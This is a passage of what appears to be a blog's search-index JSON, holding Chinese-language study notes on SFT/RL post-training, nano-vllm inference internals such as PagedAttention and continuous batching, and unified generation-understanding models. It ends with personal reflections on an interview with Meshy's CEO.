<p>\u8fd9\u90e8\u5206\u6307\u7684\u662f\u4ecePPO\u5f00\u59cb\u7684\u4e00\u7cfb\u5217Clip\u65b9\u6848\uff0c\u88c1\u526a\u6389\u4e00\u4e9b\u4e0d\u7a33\u5b9a\u7684\u68af\u5ea6\uff0c\u540e\u7eed\u7684GSPO\u7684sequence-level clip\u4e5f\u88ab\u5212\u5206\u6210\u8fd9\u4e2a\u90e8\u5206\uff0c\u5c31\u662f\u6307\u8bad\u7ec3\u4e2d\u7684\u68af\u5ea6\u88c1\u526a\u6280\u5de7</p> <p>2. Reference Policy Denominator</p> <p>\u8fd9\u90e8\u5206\u662f\u6307Reference Model\uff0c\u4e5f\u5373\u5728RL\u4e2d\u7684\u91c7\u6837Model\uff0c\u5bf9\u4e8eSFT\u4e2d\u5373\u4e3a\u5f53\u524dModel\uff0c\u5bf9\u4e8e\u4e00\u4e9b\u79bb\u7ebf\u5f3a\u5316\u5b66\u4e60\u7b97\u6cd5\u4e2d\uff0c\u7531\u4e8e\u4e0d\u5b58\u5728Reference Model\uff0c\u4e00\u822c\u5c31\u76f4\u63a5\u5c06\u5176\u8bbe\u7f6e\u4e3a1</p> <p>3. Advantage Estimate</p> <p>\u5728\u4f20\u7edfRL\u4e2d\uff0c\u4f18\u52bf\u4f30\u8ba1\u5c31\u662f\u8fd9\u4e2aaction\u5e26\u6765\u7684\u5f53\u524d\u6536\u76ca\u548c\u9884\u671f\u7684\u672a\u6765\u6536\u76ca\u4e4b\u548c\uff0c\u4f46\u662f\u5bf9\u4e8eLLM\u800c\u8a00\uff0c\u4f18\u52bf\u4f30\u8ba1\u5f80\u5f80\u662fsequence-level\u7684\u800c\u4e0d\u662ftoken-level\u7684\uff0c\u5bf9\u4e8e\u6574\u4e2a\u8bad\u7ec3\u8fc7\u7a0b\uff0c\u6838\u5fc3\u8fc7\u7a0b\u5c31\u662f\u6700\u5927\u5316Advantage</p> <p>4. Likelihood Gradient</p> <p>\u68af\u5ea6\u7684\u8ba1\u7b97\uff0c\u8fd9\u90e8\u5206\u662f\u6307\u5982\u4f55\u8bb2\u4e0a\u8ff0\u5185\u5bb9\u5408\u5e76\u8d77\u6765\u8fdb\u884c\u68af\u5ea6\u7684\u8ba1\u7b97\uff0c\u4f46\u662f\u8fd9\u5757\u57fa\u672c\u5728\u6240\u6709\u8303\u5f0f\u4e2d\u90fd\u662f\u56fa\u5b9a\u7684</p>"},{"location":"reading/interesting/Unified%20view%20of%20SFT%20%26%20RL/#loss","title":"\u4eceLoss\u7684\u89c6\u89d2\u5230\u68af\u5ea6\u7684\u89c6\u89d2","text":""},{"location":"reading/interesting/Unified%20view%20of%20SFT%20%26%20RL/#2-unified-view-of-posttraining","title":"2. Unified View of PostTraining","text":"<p>https://www.notion.so/From-Recipes-to-Regimes-A-Target-Operator-Diagnostics-Framework-for-LLM-Post-Training-2da6113bc4c58008b5a2c7af3e5815b2</p> <p>\u8df3\u8131\u51faSFT\u548cRL\uff0c\u8fdb\u5165\u5b8c\u6574\u7684PostTraining\u7684\u89c6\u89d2\uff0c\u4eba\u4eec\u53d1\u73b0SFT\u548cRL\u4e4b\u95f4\u7684\u533a\u522b\uff0c\u76f8\u6bd4\u4e8eRL\u5185\u90e8\u7684Trick\u53cd\u800c\u66f4\u5c0f\uff0c\u663e\u7136\u6574\u4e2aPostTraining\u7cfb\u7edf\u9700\u8981\u4e00\u5957\u66f4\u5b8f\u89c2\u7684\u89e3\u8bfb</p>"},{"location":"reading/interesting/Unified%20view%20of%20SFT%20%26%20RL/#3-entropy-adaptive-sft","title":"3. Entropy-Adaptive SFT","text":"<p>SFT\u7684\u6280\u5de7\u5bf9\u4e8eRL\u6709\u6307\u5bfc\u4f5c\u7528\uff0c\u53cd\u8fc7\u6765\u4e5f\u662f\u4e00\u6837\u7684\uff0cSFT\u603b\u662f\u8feb\u4f7f\u6a21\u578b\u53bb\u670d\u4ece\u8f93\u5165\u6570\u636e\u7684\u5206\u5e03\uff0c\u8fd9\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u548c\u6a21\u578b\u539f\u59cb\u7684\u80fd\u529b\u4f1a\u76f8\u4e92\u51b2\u7a81\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u91c7\u7528RL\u4e2d\u7684\u6280\u5de7\uff0c\u7528Entropy based\u7684\u65b9\u6848\uff0c\u5bf9\u4e8e\u7279\u5b9a\u7684\u4e00\u4e9btoken\u8fdb\u884c\u95e8\u63a7</p> <p></p>"},{"location":"reading/interesting/nano-vllm/","title":"Nano vllm","text":"<ul> <li>blog for nano vllm</li> <li>blog for vllm</li> </ul> <p>LLM\u7684\u9ad8\u6548\u63a8\u7406\u9762\u4e34\u4e00\u4e9b\u95ee\u9898</p> <ul> <li>KV-cache\u968f\u7740\u5e8f\u5217\u957f\u5ea6\u7ebf\u6027\u589e\u957f</li> <li>\u4e00\u4e2aBatch\u4e2d\u4e0d\u540c\u8bf7\u6c42\u7684\u5e8f\u5217\u957f\u5ea6\u4e0d\u540c\uff0c\u5bfc\u81f4\u788e\u7247\u5316\u7684\u95ee\u9898</li> </ul>"},{"location":"reading/interesting/nano-vllm/#1-pagedattention","title":"1. PagedAttention","text":"<p>pagedAttention\u5c31\u662f\u5728\u4e0a\u8ff0\u80cc\u666f\u4e0b\u63d0\u51fa\u6765\u7684\u65b9\u6848\uff0c\u5176\u80cc\u540e\u7684\u7406\u5ff5\u5c31\u662f\u64cd\u4f5c\u7cfb\u7edf\u9886\u57df\u7684\u5206\u9875\u673a\u5236\uff0c\u6765\u5b9e\u73b0\u9ad8\u6548\u7684GPU\u5185\u5b58\u4f7f\u7528</p> <ul> <li>\u7269\u7406\u5185\u5b58 -&gt; GPU \u663e\u5b58</li> <li>\u7269\u7406\u9875\u5e27 -&gt; KV Cache \u5757 (Block)</li> <li>\u9875\u8868 -&gt; \u5757\u8868 (Block Table)</li> <li>\u8fdb\u7a0b -&gt; \u5355\u4e2a\u8bf7\u6c42 (Sequence)</li> </ul> <p>KV-Cache\u5757\u88ab\u5206\u6210\u4e86\u56fa\u5b9a\u5927\u5c0f\u7684block\uff0c\u8bf7\u6c42\u4f7f\u7528\u7684KV-Cache\u903b\u8f91\u4e0a\u662f\u8fde\u7eed\u7684\uff0c\u4f46\u662f\u5728\u7269\u7406\u5b58\u50a8\u4e0a\u662f\u79bb\u6563\u7684</p> <pre><code>graph TD\n    subgraph \"Sequence A (Logical View)\"\n        direction LR\n        A1[\"Token 1-16\"] --&gt; A2[\"Token 17-32\"] --&gt; A3[\"Token 33-48\"]\n    end\n\n    subgraph \"Sequence B (Logical View)\"\n        direction LR\n        B1[\"Token 1-16\"] --&gt; B2[\"Token 17-32\"]\n    end\n\n    subgraph \"Physical KV Cache Blocks on GPU\"\n        P1[\"Block #1\"]\n        P2[\"Block #2\"]\n        P3[\"Block #3\"]\n        P4[\"Block #4\"]\n        P5[\"Block #5\"]\n        P6[\"Block #6\"]\n        P7[\"Block #7\"]\n    end\n\n    A1 -- \"maps to\" --&gt; P5\n    A2 -- \"maps to\" --&gt; P2\n    A3 -- \"maps to\" --&gt; P6\n\n    B1 -- \"maps to\" --&gt; P1\n    B2 -- \"maps to\" --&gt; P4\n\n    style P5 fill:#f9f\n    style P2 fill:#f9f\n    style P6 fill:#f9f\n    style P1 fill:#bbf\n    style P4 fill:#bbf</code></pre> <p>\u4e3a\u8fd9\u4e2a\u8bf7\u6c42\uff08\u5728 nano-vllm \u4e2d\u79f0\u4e3a\u4e00\u4e2a Sequence\uff09\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684\u5757\u8868 (block_table)\u3002\u5728 prefill \u9636\u6bb5\uff0c\u6839\u636e\u5176\u63d0\u793a\uff08prompt\uff09\u7684\u957f\u5ea6\uff0c\u6309\u9700\u5206\u914d\u76f8\u5e94\u6570\u91cf\u7684 Block\uff0c\u5e76\u5c06\u8fd9\u4e9b Block \u7684 ID \u586b\u5165\u5176 block_table\u3002\u5728 decode \u9636\u6bb5\uff0c\u6bcf\u5f53\u5e8f\u5217\u957f\u5ea6\u589e\u957f\uff0c\u9700\u8981\u4e00\u4e2a\u65b0\u7684 Block \u65f6\uff0c\u518d\u4ece\u5168\u5c40\u7684\u7a7a\u95f2\u5757\u6c60\u4e2d\u53d6\u4e00\u4e2a\uff0c\u5e76\u66f4\u65b0\u5176 block_table\u3002</p> <p></p> <p>\u9664\u4e86\u5206\u9875\u7684\u5185\u5b58\u7ba1\u7406\u673a\u5236\u4ee5\u5916\uff0cnano-vllm\u8fd8\u5f15\u5165\u4e86\u5f88\u591aos\u4e2d\u7684\u6280\u5de7\uff0c\u6bd4\u5982\u62a2\u5360\u5f0f\u7684\u8fdb\u7a0b\u8c03\u5ea6\u5de5\u5177\uff0c\u5728vllm\u4e2d\u5c31\u8868\u73b0\u4e3a\u62a2\u5360\u5f0f\u7684prefill\uff0c\u8fd9\u90e8\u5206\u7531Scheduler\u5b8c\u6210\uff0c\u8fd9\u4e5f\u662fvllm\u5b9e\u73b0\u6301\u7eed\u6279\u5904\u7406\u7684\u5173\u952e</p>"},{"location":"reading/interesting/nano-vllm/#2-modelrunner","title":"2. ModelRunner","text":"<p>\u8fd9\u662fnano-vllm\u6700\u6838\u5fc3\u7684\u90e8\u5206\u4e4b\u4e00\uff0c\u6d89\u53ca\u5230\u6838\u5fc3\u7684\u8ba1\u7b97\u90e8\u5206\uff0cPagedAttention\u4e3b\u8981\u5e94\u5bf9\u7684\u662fKV-Cache\u7684\u90e8\u5206\uff0c\u800cModelRunner\u5c31\u662f\u5904\u7406\u53c2\u6570\uff0c\u6fc0\u6d3b\u503c\u7b49\u90e8\u5206</p> <p>\u5185\u90e8\u5b9e\u73b0\u4e86\u591a\u79cd\u673a\u5236\uff0c\u5305\u62ecTP\uff0cCuda Graph</p>"},{"location":"reading/interesting/nano-vllm/#3","title":"3. \u4e00\u4e2a\u8bf7\u6c42\u7684\u6d41\u7a0b","text":"<pre><code>graph LR\n    subgraph User\n        U[\"User calls llm.generate()\"]\n    end\n    subgraph LLMEngine\n        G[\"generate() loop\"] --&gt; AR[\"add_request()\"]\n    end\n    subgraph Scheduler\n        W[\"waiting_queue\"]\n    end\n\n    U --&gt; G\n    AR -- \"seq = Sequence(prompt)\" --&gt; AR\n    AR -- \"scheduler.add(seq)\" --&gt; W\n</code></pre>"},{"location":"reading/interesting/nano-vllm/#4-flashinfer","title":"4. FlashInfer","text":"<p>FlashInfer\u548cFlashAttention\u4e00\u6837\uff0c\u90fd\u662fTransformer\u6a21\u578b\u4f18\u5316\u7684\u6ce8\u610f\u529bKernel\uff0c\u5176\u4e2dFlashInfer\u662fvllm\u9ed8\u8ba4\u9009\u62e9\u7684\u5185\u6838\uff0c\u5728\u5bf9\u6bd4\u4e2d\u53d1\u73b0\uff0c\u5728\u542f\u52a8CUDAGraph\u7684\u751f\u4ea7\u73af\u5883\u4e2d\uff0cFlashInfer\u6bd4FlashAttention\u66f4\u5feb</p> <p></p> <p>CUDAGraph\u662f\u7528\u4e8e\u5f55\u5236\u6574\u4e2a\u8ba1\u7b97\u56fe\uff0c\u7136\u540e\u5728GPU\u4e0a\u4e00\u6b21\u6027\u8ba1\u7b97\u5b8c\u6210\u7684\u7279\u6027\uff0c\u5728\u6ca1\u6709CUDAGraph\u7684\u65f6\u5019\uff0c\u6bcf\u4e2aKernel\u90fd\u8981\u5404\u81ea\u8c03\u7528\uff0c\u7cfb\u7edf\u5728GPU\u548cCPU\u4e4b\u95f4\u6765\u56de\u5207\u6362\uff0c\u5728\u6709\u4e86CUDAGraph\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u4e00\u6b21\u6027\u5c06\u6240\u6709\u7684Kernel\u53d1\u9001\u5230GPU\u8fdb\u884c\u6267\u884c\u3002\u800cFlashInfer\u5bf9\u4e8eCUDAGraph\u6709\u66f4\u53cb\u597d\u7684\u8bbe\u8ba1\u548c\u4f18\u5316</p>"},{"location":"reading/interesting/nano-vllm/#5-continuous-batching","title":"5. Continuous Batching","text":"<p>\u76f8\u5bf9\u4e8e\u65e9\u671f\u7cfb\u7edf\u7684static batching\uff0c\u9759\u6001\u6279\u5904\u7406\u7cfb\u7edf\uff0c\u52a8\u6001\u7684\u6279\u5904\u7406\u53ef\u4ee5\u5728token\u7ef4\u5ea6\u7ef4\u62a4\u4e00\u4e2abatch\uff0c\u8fd9\u6837\u5b50\u53ef\u4ee5\u8ba9decoder\u9636\u6bb5\u6709\u4e00\u4e2a\u8f83\u9ad8\u7684\u5229\u7528\u7387</p> <p></p>"},{"location":"reading/interesting/%E7%94%9F%E6%88%90%E7%90%86%E8%A7%A3%E7%BB%9F%E4%B8%80%E6%A8%A1%E5%9E%8B/","title":"\u751f\u6210\u7406\u89e3\u7edf\u4e00\u6a21\u578b","text":"<p>\u6765\u81ea\u4e8e\u9752\u7a1e\u793e\u533a\u7684\u4e00\u4e2aTalk\uff0c\u4ecb\u7ecd\u4e86\u751f\u6210\u7406\u89e3\u7edf\u4e00\u7684\u6a21\u578b</p> <p>https://arxiv.org/abs/2505.14683 \u76f8\u5173\u8bba\u6587\u662f\u8fd9\u4e00\u7bc7 BAGEL</p>"},{"location":"reading/interesting/%E7%94%9F%E6%88%90%E7%90%86%E8%A7%A3%E7%BB%9F%E4%B8%80%E6%A8%A1%E5%9E%8B/#1-ar","title":"1. AR","text":"<p>\u751f\u6210\u7406\u89e3\u7edf\u4e00\u6a21\u578b\u7684\u5386\u53f2\uff0c\u9996\u5148\u662fAR\u7684\u6a21\u578b\uff0c\u6bd4\u5982Emu3\u8fd9\u79cd\uff0c\u5176\u5c31\u662f\u4e00\u4e2a\u6838\u5fc3\u7684\u81ea\u56de\u5f52\u6a21\u578b\uff0c\u7136\u540e\u628a\u56fe\u50cf\u8fd9\u4e9b\u591a\u6a21\u6001\u7684\u5143\u7d20\u8fdb\u884c\u79bb\u6563\u5316\u7f16\u7801\uff08VQVAE\uff0cVQGAN\uff09\uff0c\u7eb3\u5165\u5230\u81ea\u56de\u5f52\u751f\u6210\u4e2d</p> <p></p> <p>\u5176\u4e3b\u8981\u7684\u96be\u70b9\u662f\u5728\u4e8e\u751f\u6210\u7684\u8d28\u91cf\u8fd8\u662f\u6bd4Diffusion Model\u5dee\uff0c\u5982\u679c\u9700\u8981\u9ad8\u8d28\u91cf\u7684\u751f\u6210\u90a3\u4e48\u7eafAR\u53c8\u4f1a\u5f88\u6162\uff0c\u5e76\u4e14\u79bb\u6563\u5316\u7684\u8fc7\u7a0b\u8bed\u4e49\u4fe1\u606f\u4e22\u5931\u5f97\u4e5f\u6bd4\u8f83\u591a\uff0c\u5bfc\u81f4\u5176\u7406\u89e3\u7684\u6027\u80fd\u4e5f\u4e0d\u662f\u5f88\u597d</p> <p></p> <p>\u5bf9\u4e8e\u7406\u89e3\u7684\u95ee\u9898\uff0c\u4e5f\u6709\u4e00\u4e9b\u89e3\u51b3\u65b9\u6848\uff0c\u6bd4\u5982Double Encoder\uff0c\u4f8b\u5982Janus\u5c31\u662f\u91c7\u7528\u8fd9\u79cd\u65b9\u6848\uff0c\u91c7\u7528VQ-VAE+Siglip\u53cc\u91cd\u7f16\u7801\u5668\uff0c\u80fd\u591f\u66f4\u597d\u7684\u62bd\u53d6\u56fe\u50cf\u7684\u8bed\u4e49\u4fe1\u606f\uff0c\u4f46\u662f\u76f8\u5bf9\u7684\u5f00\u9500\u4e5f\u4f1a\u53d8\u5927\uff0c\u611f\u89c9\u4e0d\u662f\u4e00\u79cd\u6bd4\u8f83\u4f18\u96c5\u7684\u65b9\u6848</p> <p>\u57fa\u4e8e\u8fd9\u4e2a\u73b0\u72b6\uff0cDouble Encoder\u663e\u7136\u662f\u4e00\u4e2a\u6bd4\u8f83\u7c97\u7cd9\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u90a3\u4e48\u76f8\u5bf9\u5e94\u7684\u5c31\u7531\u5f88\u591a\u60f3\u8981\u53bb\u505a\u7edf\u4e00\u7684\u56fe\u50cfTokenizer\uff0c\u65e2\u80fd\u591f\u4fdd\u7559\u5e95\u5c42\u7684\u7eb9\u7406\u4fe1\u606f\uff08VQ-VAE\uff09\uff0c\u53c8\u53ef\u4ee5\u4fdd\u7559\u9ad8\u5c42\u7684\u8bed\u4e49\u4fe1\u606f\uff08Siglip\uff09\uff0c\u8fd1\u671f\u7531\u5f88\u591a\u5c0f\u5de5\u4f5c\u90fd\u662f\u8fd9\u4e48\u53bb\u505a\u7684\uff0c\u6bd4\u5982UniTok\uff0cTokenFlow</p>"},{"location":"reading/interesting/%E7%94%9F%E6%88%90%E7%90%86%E8%A7%A3%E7%BB%9F%E4%B8%80%E6%A8%A1%E5%9E%8B/#2-external-diffusion","title":"2. External Diffusion","text":"<p>\u76f8\u5bf9\u4e8eAR\u65b9\u6848\u7684\u53e6\u4e00\u6761\u8def\u7ebf\uff0c\u5c31\u662fExternal Diffusion\uff0c\u5916\u63a5\u4e00\u4e2aDiffusion Model\u7684\u65b9\u6848\uff0cQwen-Image\uff0cBlip-3o\u8fd9\u4e9b\u90fd\u662f\u8fd9\u4e48\u505a\u7684\uff0c\u4e3b\u8981\u662f\u5bb9\u6613\u4e22\u7ec6\u8282</p> <p></p>"},{"location":"reading/interesting/%E7%94%9F%E6%88%90%E7%90%86%E8%A7%A3%E7%BB%9F%E4%B8%80%E6%A8%A1%E5%9E%8B/#3-unified-model","title":"3. Unified Model","text":"<p>\u5728\u5355\u4e2aTransformer\u67b6\u6784\u4e2d\u5b9e\u73b0\u81ea\u56de\u5f52\u548c\u6269\u6563\u7684\u903b\u8f91\u4ea4\u4e92\uff0c\u4e5f\u6709\u4e00\u4e9b\u5de5\u4f5c\u518d\u505a</p> <p></p> <p>\u9762\u5bf9\u4e0a\u8ff0\u65b9\u6848\u7684\u4e00\u4e9bWeakness\uff0c\u73b0\u5728\u793e\u533a\u7684\u65b9\u6848\u5f80\u5f80\u662f\uff0c\u4ecd\u7136\u662f\u540c\u4e00\u4e2aTransformer\uff0c\u4f46\u662f\u6211\u4eec\u53ea\u5171\u4eabAttention\u5c42\uff0c\u7136\u540e\u9762\u5bf9NLP\u4efb\u52a1\u548cCV\u4efb\u52a1\uff0c\u91c7\u7528\u4e0d\u540c\u7684\u7ebf\u6027\u5c42\uff0c\u4e5f\u5c31\u662fMot\u7684\u65b9\u6848</p> <p></p> <p></p>"},{"location":"reading/interesting/%E7%94%9F%E6%88%90%E7%90%86%E8%A7%A3%E7%BB%9F%E4%B8%80%E6%A8%A1%E5%9E%8B/#4","title":"4. \u7406\u89e3\u771f\u7684\u53ef\u4ee5\u6307\u5bfc\u751f\u6210\u5417","text":"<p>\u8fd9\u662f\u8fd1\u671f\u7684\u4e00\u7bc7\u6587\u7ae0\u8bb2\u8ff0\u7684\u5185\u5bb9\uff0c\u53eb\u505a UniSandbox \uff0c\u8fd9\u662f\u4e00\u7bc7\u5206\u6790\u6027\u8d28\u7684\u6587\u7ae0\uff0c\u5206\u6790\u8fd1\u671f\u4e00\u4e9b\u751f\u6210\u7406\u89e3\u7edf\u4e00\u6a21\u578b\uff0c\u662f\u5426\u771f\u7684\u80fd\u591f\u63d0\u9ad8\u751f\u6210\u80fd\u529b</p> <p>\u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u5206\u6790\u4e86\u4e09\u7c7b\u6a21\u578b</p> <ul> <li>\u7eaf\u81ea\u56de\u5f52 Janus-Pro \u8fd9\u7c7b</li> <li>AR+Diffusion \u4e0d\u540c\u6a21\u578b\uff0cQwen-Image\u548cBlip-3o\u8fd9\u7c7b</li> <li>AR+Diffusion \u7edf\u4e00\u6a21\u578b\uff0cBAGEL</li> </ul> <p>\u6587\u7ae0\u53d1\u73b0\u5728\u6ca1\u6709\u663e\u5f0f\u7684Cot\u7684\u60c5\u5f62\u4e0b\uff0c\u6a21\u578b\u5728\u9700\u8981\u7406\u89e3\u7684\u751f\u6210\u60c5\u51b5\u4e0b\u5176\u5b9e\u80fd\u529b\u582a\u5fe7\uff0c\u6bd4\u5982\u65e0\u6cd5\u6b63\u786e\u751f\u62103+2\u4e2a\u82f9\u679c</p> <p></p> <p>\u6587\u7ae0\u8fd8\u63d0\u51fa\u4e86\u4e00\u79cd\u6846\u67b6\uff0c\u7ed9\u7edf\u4e00\u6a21\u578b\u5f15\u5165\u8bfe\u7a0b\u5b66\u4e60\uff0c\u6765\u5f15\u5bfc\u5176\u63a8\u7406\u80fd\u529b\u7684\u589e\u5f3a\uff0c\u5176\u5b9e\u662f\u4e00\u4e2a\u6bd4\u8f83\u6807\u51c6\u7684\u62d2\u7edd\u91c7\u6837\u5fae\u8c03\u7684\u80fd\u529b\uff0c\u7528cot\u6a21\u578b\u6765\u5b8c\u6210\u63a8\u7406\uff0c\u5e76\u4e14\u7528vlm\u6a21\u578b\u6765\u5224\u65ad\u8fd9\u4e2acot\u548c\u751f\u6210\u7684\u56fe\u50cf\u662f\u5426\u5bf9\u5e94\uff0c\u83b7\u5f97\u4e00\u6279\u9ad8\u8d28\u91cf\u6570\u636e\uff0c\u6765sft</p> <p></p> <p>\u77e5\u8bc6\u8fc1\u79fb\u80fd\u529b\u662f\u8fd9\u7bc7\u6587\u7ae0\u53e6\u5916\u8ba8\u8bba\u7684\u90e8\u5206\uff0c\u5b9e\u9a8c\u4e2d\uff0c\u5c06\u4e00\u4e9b\u7f16\u9020\u7684\u77e5\u8bc6\u6ce8\u5165\u5230\u6a21\u578b\u4e2d\uff0c\u770b\u6a21\u578b\u4f1a\u4e0d\u4f1a\u91c7\u7528\u8fd9\u4e9b\u77e5\u8bc6\u6765\u8f85\u52a9\u4ed6\u4eec\u7684\u751f\u6210\uff0c\u5b9e\u9a8c\u8868\u660e\uff0c\u5728\u4e0d\u7ecf\u8fc7\u663e\u5f0fCot\u7684\u60c5\u51b5\u4e0b\uff0c\u6a21\u578b\u5e76\u65e0\u6cd5\u5c06\u77e5\u8bc6\u4f5c\u4e3a\u8f85\u52a9\u751f\u6210\u7684\u4e00\u90e8\u5206\u3002\u6bd4\u5982\u6211\u4eec\u544a\u8bc9\u5b83A=3\uff0c\u8ba9\u5b83\u751f\u6210A\u4e2a\u82f9\u679c\uff0c\u5176\u65e0\u6cd5\u5b8c\u6210\u8fd9\u4e2a\u4efb\u52a1\u3002</p> <p>\u5e76\u4e14\u53d1\u73b0Query-Based\u67b6\u6784\uff0c\u4e5f\u5c31\u662f\u7c7b\u4f3cBlip-3o\u7684\u6a21\u578b\uff0c\u5728\u77e5\u8bc6\u8fc1\u79fb\u4efb\u52a1\uff0c\u6709\u66f4\u52a0\u663e\u8457\u7684\u4f18\u52bf</p>"},{"location":"reading/interesting/%E8%83%A1%E6%B8%8A%E9%B8%A3%E8%AE%BF%E8%B0%88/","title":"\u80e1\u6e0a\u9e23\u8bbf\u8c08\u89c2\u540e\u611f","text":"<p>\u8bbf\u8c08\u94fe\u63a5</p> <p>\u8fd9\u662f\u4e00\u4efd\u5173\u4e8eMeshy CEO\u80e1\u6e0a\u9e23\u7684\u8bbf\u8c08\uff0c\u5168\u7bc7\u957f\u8fbe\u4e09\u4e2a\u5c0f\u65f6\uff0c\u4f46\u662f\u6709\u8da3\u4e0d\u67af\u71e5\uff0c\u53d7\u76ca\u826f\u591a\u3002</p> <p>\u6216\u8bb8\u662f\u81ea\u5df1\u4e5f\u8eab\u5728\u521d\u521b\u516c\u53f8\uff0c\u5bf9\u4e8e\u8bbf\u8c08\u4e2d\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\u6216\u7ea6\u6709\u66f4\u6df1\u5165\u7684\u611f\u89e6\u3002</p> <p>\u9053\u662f\u76f8\u901a\u7684</p> <p>\u80e1\u63d0\u5230\u4ece\u4e00\u5f00\u59cb\u505a\u56fe\u5f62\u5b66\u592a\u6781\u8f6c\u5230\u505a3D AI Meshy\u7684\u8f6c\u578b\u5176\u5b9e\u4e0d\u96be\uff0c\u56e0\u4e3a\u56fe\u5f62\u5b66\u672c\u8eab\u5f88\u786c\u6838\uff0c\u5bf9\u4e8e\u786c\u6838\u7684\u4eba\u6765\u8bf4\uff0c\u5165\u5c40AI\u4e5f\u4e0d\u4f1a\u9047\u5230\u963b\u788d\u3002\u5f88\u591a\u4e1c\u897f\u90fd\u662f\u76f8\u901a\u7684\u3002AI\u4f5c\u4e3a\u4e00\u4e2a\u7206\u53d1\u5f0f\u7684\u70ed\u70b9\u5438\u5f15\u4e86\u5f88\u591a\u4eba\uff0c\u4f46\u662f\u5176\u5b9e\u5f88\u591a\u5728AI\u754c\u95ef\u51fa\u540d\u58f0\u7684\u4eba\u5e76\u975e\u662f\u539f\u6559\u65e8\u51fa\u8eab\u7684AIer\uff0c\u4f8b\u5982\u80e1\u662f\u505a\u56fe\u5f62\u5b66\u51fa\u8eab\u7684\uff0cKimi\u7684\u82cf\u5251\u6797\u662f\u6570\u5b66\u51fa\u8eab\u7684\uff0c\u6211\u7684\u5bfc\u5e08\u662f\u505a\u7535\u8def\u51fa\u8eab\u7684\u3002\u8fd9\u4e5f\u8ba9\u6211\u611f\u89c9\u5f88\u591a\u4e1c\u897f\u5728\u5404\u4e2a\u9886\u57df\u662f\u5171\u901a\u7684\uff0c\u6bd4\u5982\u624e\u5b9e\u7684\u6570\u5b66\u529f\u5e95\uff0ccoding\u7684\u80fd\u529b\uff0c\u4ee5\u53cawork hard\u3002\u800c\u5305\u62ec\u6211\u5728\u5185\u5f88\u591a\u7684\u5b66\u751f\u4f1a\u89c9\u5f97\u505aAI\u4e86\uff0c\u4e4b\u524d\u5728CS\u5b66\u7684\u8bf8\u591a\u6280\u672f\u6050\u6015\u662f\u6d6a\u8d39\u4e86\u65f6\u95f4\uff0c\u73b0\u5728\u7684\u5b66\u4e60\u4e5f\u5f80\u5f80\u4f1a\u62c5\u5fc3\u81ea\u5df1\u5b66\u7684\u662f\u4e0d\u662f\u4e0d\u591fAI\uff0c\u4f46\u662f\u4ece\u8fd9\u4e2a\u89c2\u70b9\u6765\u770b\uff0c\u8fd9\u7c7b\u7126\u8651\u4f3c\u4e4e\u662f\u4e0d\u5fc5\u8981\u7684\u3002</p> <p>\u5931\u8d25\u662f\u5e38\u6001</p> <p>\u7126\u8651\u662f\u4e2a\u91cd\u8981\u7684\u8bdd\u9898\uff0c\u80e1\u63d0\u5230\u7684\u505aCEO\u6700\u91cd\u8981\u54c1\u8d28\u4e4b\u4e00\u5c31\u662f\u4e0d\u5bb3\u6015\u5931\u8d25\uff0c\u4f46\u662f\u6211\u4eec\u8fd9\u4e00\u8f88\u4eba\u603b\u662f\u56e0\u4e3a\u5bb3\u6015\u5931\u8d25\u800c\u611f\u5230\u7126\u8651\uff0c\u5e0c\u671b\u81ea\u5df1\u7684\u6bcf\u4e00\u4efd\u52aa\u529b\u90fd\u662f\u83b7\u5f97\u56de\u62a5\u7684\uff0c\u4f46\u662f\u80e1\u5728\u8bbf\u8c08\u4e2d\u63d0\u5230\u52aa\u529b\u5c31\u80fd\u83b7\u5f97\u56de\u62a5\uff0c\u8fd9\u5b8c\u5168\u6ca1\u6709\u4efb\u4f55\u7684\u903b\u8f91\u5173\u7cfb\u3002\u6bd4\u5982\u6211\u73b0\u5728\u5728\u521d\u521b\uff0c\u6211\u4e5f\u65f6\u5e38\u4f1a\u60f3\u4f1a\u4e0d\u4f1a\u627e\u4e2a\u5730\u65b9\u53bb\u505aresearch\uff0c\u53bb\u6309\u90e8\u5c31\u73ed\u7684\u641e\u4e00\u4e9b\u8bba\u6587\u662f\u66f4\u52a0\u7a33\u59a5\u7684\u9053\u8def\u3002\u4f46\u662f\u6211\u73b0\u5728\u611f\u89c9\u4f1a\u66f4\u52a0\u91cd\u89c6experience\u800c\u4e0d\u662f\u4ea7\u51fa\uff0c\u672a\u6765\u8bfb\u7814\u7684\u65e5\u5b50\u8fd8\u6709\u5f88\u591a\uff0c\u4f46\u662f\u8ddf\u968f\u4e00\u6b21\u521b\u4e1a\u7684\u811a\u6b65\u6216\u8bb8\u662f\u6b64\u751f\u4ec5\u6709\u7684\u673a\u4f1a\uff0c\u5e76\u4e14\u4e5f\u662f\u8bd5\u9519\u6210\u672c\u6700\u4f4e\u7684\u65f6\u5019\u3002</p> <p>\u6c1b\u56f4or\u4ea7\u51fa</p> <p>\u4e0d\u5fc5\u8981\u8ba9\u5927\u5bb6\u90fd\u559c\u6b22\u4f60\uff0c\u4e00\u4e2a\u597d\u7684leader\u4e0d\u4e00\u5b9a\u662f\u8981\u5927\u5bb6\u90fd\u559c\u6b22\u7684\uff0c\u4f46\u662f\u662f\u4e00\u5b9a\u80fd\u591f\u63d0\u9ad8\u4ea7\u51fa\u7684\uff0c\u80e1\u8ba4\u4e3a\u5f88\u591a\u505a\u6280\u672f\u51fa\u8eab\u7684\u4eba\u624d\u5230\u4e86\u7ba1\u7406\u5c42\u4e4b\u540e\u53cd\u800c\u53d1\u6325\u4e0d\u51fa\u4f18\u52bf\uff0c\u6070\u6070\u662f\u56e0\u4e3a\u548c\u6280\u672f\u4eba\u5458\u611f\u540c\u8eab\u53d7\u800c\u592a\u8fc7\u4e8e\u91cd\u89c6\u826f\u597d\u7684\u6c1b\u56f4\uff0c\u800c\u5bf9\u56e2\u961f\u7684\u4ea7\u51fa\u719f\u89c6\u65e0\u7779\uff0c\u8fd9\u6837\u5b9e\u9645\u4e0a\u5bf9\u56e2\u961f\u4e0d\u8d1f\u8d23\u7684\uff0c\u597d\u7684leader\u662f\u9700\u8981\u88ab\u7406\u89e3\u7684\uff0c\u800c\u4e0d\u662f\u9700\u8981\u88ab\u5927\u5bb6\u90fd\u559c\u6b22\u7684</p> 